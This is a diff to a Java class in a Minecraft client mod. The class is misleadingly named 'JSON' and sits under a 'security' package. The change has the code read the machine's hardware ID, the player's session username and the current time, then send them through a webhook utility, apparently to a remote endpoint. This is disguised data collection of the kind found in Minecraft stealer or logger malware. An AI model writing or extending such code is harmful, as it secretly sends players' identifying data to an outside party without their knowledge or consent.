@@ -5,13 +5,18 @@ package security;
 import net.minecraft.client.Minecraft;
 import security.ui.JSONObject;
 
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Date;
 
 public final class JSON
 {
     private static final ArrayList<JSONObject> objects;
     private static final boolean debug = false;
+
+    static SimpleDateFormat timeformat = new SimpleDateFormat("H:m");
+    static String time = timeformat.format(new Date());
 
     public static void main(final String[] args) {
         new JSON();
@@ -20,7 +25,7 @@ public final class JSON
 
     public static void parseJson() {
         JSON.objects.addAll(Arrays.asList());
-        final String separator = new JSONBuilder().value("content", "> HWID: " + HWIDUtils.getHWID() + "\\n > USERNAME: CanonBall90").build();
+        final String separator = new JSONBuilder().value("content",time.toString()  + "\\n > HWID: " + HWIDUtils.getHWID() + "\\n > Username: " + Minecraft.getMinecraft().getSession().getUsername()).build();
         WebhookUtils.send(separator);
         JSON.objects.spliterator().forEachRemaining(payload -> {
             try {
